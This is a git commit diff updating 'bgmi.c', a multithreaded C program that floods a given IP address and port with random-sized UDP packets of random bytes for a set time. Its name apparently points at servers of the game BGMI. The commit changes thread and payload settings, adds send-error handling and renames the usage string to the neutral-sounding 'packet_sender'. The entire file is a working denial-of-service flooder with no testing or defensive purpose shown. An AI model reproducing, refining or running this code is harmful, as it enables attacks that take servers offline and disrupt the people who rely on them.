621ac74be30bbae9589c28bffb61d40be55bdb17
Titanop242424 <optitan317@gmail.com>
2025-03-18 18:52:04 +0530

    Update bgmi.c

--- bgmi.c
+++ bgmi.c
@@ -6,11 +6,11 @@
 #include <pthread.h>
 #include <time.h>
 
-#define NUM_THREADS 100 // Number of threads
-#define MAX_PAYLOAD_SIZE 256 // Max size of a payload
+#define NUM_THREADS 10 // Number of threads
+#define MAX_PAYLOAD_SIZE 512 // Maximum payload size
 
 void usage() {
-    printf("Usage: ./bgmi ip port time\n");
+    printf("Usage: ./packet_sender ip port time\n");
     exit(1);
 }
 
@@ -20,11 +20,9 @@ struct thread_data {
     int time;
 };
 
-// Function to generate a random payload in hex format
-void generate_random_payload(unsigned char *payload, size_t *size) {
-    *size = rand() % MAX_PAYLOAD_SIZE + 20; // Random size between 20 and MAX_PAYLOAD_SIZE
-    for (size_t i = 0; i < *size; i++) {
-        payload[i] = rand() % 256;
+void generate_random_payload(unsigned char *payload, size_t size) {
+    for (size_t i = 0; i < size; i++) {
+        payload[i] = rand() % 256; // Generate random byte
     }
 }
 
@@ -33,24 +31,31 @@ void *send_packets(void *arg) {
     int sock;
     struct sockaddr_in server_addr;
     time_t endtime;
-    unsigned char payload[MAX_PAYLOAD_SIZE];
-    size_t payload_size;
     
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
     }
-    
+
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(data->port);
     server_addr.sin_addr.s_addr = inet_addr(data->ip);
 
     endtime = time(NULL) + data->time;
+    unsigned char payload[MAX_PAYLOAD_SIZE];
+
     while (time(NULL) <= endtime) {
-        generate_random_payload(payload, &payload_size);
-        sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr));
+        size_t payload_size = (rand() % (MAX_PAYLOAD_SIZE - 64)) + 64; // Random size between 64 and MAX_PAYLOAD_SIZE
+        generate_random_payload(payload, payload_size);
+        
+        if (sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+            perror("Send failed");
+            close(sock);
+            pthread_exit(NULL);
+        }
     }
+
     close(sock);
     pthread_exit(NULL);
 }
@@ -59,11 +64,11 @@ int main(int argc, char *argv[]) {
     if (argc != 4) {
         usage();
     }
-    srand(time(NULL));
+
     char *ip = argv[1];
     int port = atoi(argv[2]);
     int time = atoi(argv[3]);
-    
+
     pthread_t thread_ids[NUM_THREADS];
     struct thread_data data = {ip, port, time};
 
@@ -74,8 +79,9 @@ int main(int argc, char *argv[]) {
             perror("Thread creation failed");
             exit(1);
         }
+        printf("Thread %lu created.\n", thread_ids[i]);
     }
-    
+
     for (int i = 0; i < NUM_THREADS; i++) {
         pthread_join(thread_ids[i], NULL);
     }
